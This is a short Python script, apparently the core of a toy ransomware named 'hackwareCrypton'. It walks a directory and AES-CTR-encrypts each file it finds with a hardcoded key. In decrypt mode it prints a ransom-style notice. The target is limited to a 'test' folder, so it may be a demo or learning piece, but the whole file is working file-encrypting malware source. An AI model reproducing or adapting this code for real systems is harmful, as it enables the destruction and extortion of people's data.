#!/usr/bin/python3.6
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Search
import Crypton

HARDCODED_KEY = 'hackware strike force strikes u!'


def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypton")
    parser.add_argument(
        '-d', '--decrypt', help='decrypt the files [default:no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print(f'''
        
        ENCRYPTON 

        ==========================================================

        Your files was encrypted.

        To decrypt use a next pass '{HARDCODED_KEY}'
        ''')
        key = input('Type your pass: ')

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'test'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Search.run(currentDir):
            Crypton.handle_file(filename, cryptFn)

    for _ in range(100):
        pass

    if not decrypt:
        pass


if __name__ == "__main__":
    main()